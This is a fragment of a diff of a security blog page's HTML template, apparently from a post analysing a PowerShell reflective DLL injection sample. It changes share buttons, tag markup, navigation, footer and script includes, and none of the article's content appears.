+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://misthi0s.github.io/posts/2024-05-12-powershell-reflective-dll-injection-sample-1/" data-title="Deep Analysis of a Powershell-Based Reflective DLL Injection Sample, Part 1" data-via="_misthi0s" data-hashtags="malware,.net,powershell,AsyncRAT,dll,reflection"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://misthi0s.github.io/posts/2024-05-12-powershell-reflective-dll-injection-sample-1/" data-hashtag="malware"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://misthi0s.github.io/posts/2024-05-12-powershell-reflective-dll-injection-sample-1/" data-title="Deep Analysis of a Powershell-Based Reflective DLL Injection Sample, Part 1"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://misthi0s.github.io/posts/2024-05-12-powershell-reflective-dll-injection-sample-1/" data-title="Deep Analysis of a Powershell-Based Reflective DLL Injection Sample, Part 1"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://misthi0s.github.io/posts/2024-05-12-powershell-reflective-dll-injection-sample-1/" data-title="Deep Analysis of a Powershell-Based Reflective DLL Injection Sample, Part 1"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
             </div>
         </div>
     </div>
 
     <div class="post-info-more">
-        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i><a href="/tags/malware/">Malware</a>, <a href="/tags/.net/">.Net</a>, <a href="/tags/powershell/">Powershell</a>, <a href="/tags/asyncrat/">AsyncRAT</a>, <a href="/tags/dll/">Dll</a>, <a href="/tags/reflection/">Reflection</a></section>
-        <section class="post-back">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/malware/">Malware</a>,&nbsp;<a href="/tags/.net/">.Net</a>,&nbsp;<a href="/tags/powershell/">Powershell</a>,&nbsp;<a href="/tags/asyncrat/">AsyncRAT</a>,&nbsp;<a href="/tags/dll/">Dll</a>,&nbsp;<a href="/tags/reflection/">Reflection</a></section>
+        <section>
             <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
         </section>
     </div>
@@ -297,20 +332,20 @@
     <div class="post-nav"><a href="/posts/2023-03-08-hunting-impacket-rce-tools/" class="prev" rel="prev" title="Hunting for Impacket&#39;s Remote Code Execution Tools"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Hunting for Impacket's Remote Code Execution Tools</a>
             <a href="/posts/2024-12-01-alternate-execution-methods-encoding-in-memory-powershell/" class="next" rel="next" title="Alternate Execution Methods - Encoding Payloads and Executing In-Memory via PowerShell">Alternate Execution Methods - Encoding Payloads and Executing In-Memory via PowerShell<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
 </div>
-</div></article></div>
+</article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.148.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreferrer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.148.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.0"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
                 </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">xxxx</a></span></div>
         </div>
     </footer></div>
 
         <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                 <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
-            </a>
-        </div>
-
-        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                 <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
             </a>
-        </div><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{}};</script><script src="/js/theme.min.js"></script></body>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'G-GPNGKH3S27', { 'anonymize_ip': true });
+        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-GPNGKH3S27" async></script></body>
 </html>
